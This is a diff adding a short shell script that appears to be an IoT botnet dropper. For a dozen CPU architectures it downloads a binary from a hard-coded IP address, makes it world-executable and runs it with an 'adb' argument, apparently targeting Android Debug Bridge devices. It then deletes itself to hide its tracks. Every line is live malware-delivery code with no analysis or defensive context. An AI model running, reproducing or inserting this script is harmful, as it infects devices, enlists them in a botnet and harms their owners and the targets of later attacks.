@@ -1,0 +1,14 @@
+curl http://103.118.30.166/arm; chmod 777 arm; ./arm adb
+curl http://103.118.30.166/arm5; chmod 777 arm5; ./arm5 adb
+curl http://103.118.30.166/arm6; chmod 777 arm6; ./arm6 adb
+curl http://103.118.30.166/arm7; chmod 777 arm7; ./arm7 adb
+curl http://103.118.30.166/m68k; chmod 777 m68k; ./m68k adb
+curl http://103.118.30.166/mips; chmod 777 mips; ./mips adb
+curl http://103.118.30.166/mpsl; chmod 777 mpsl; ./mpsl adb
+curl http://103.118.30.166/ppc; chmod 777 ppc; ./ppc adb
+curl http://103.118.30.166/sh4; chmod 777 sh4; ./sh4 adb
+curl http://103.118.30.166/spc; chmod 777 spc; ./spc adb
+curl http://103.118.30.166/x86; chmod 777 x86; ./x86 adb
+curl http://103.118.30.166/x86_64; chmod 777 x86_64; ./x86_64 adb
+
+rm $0
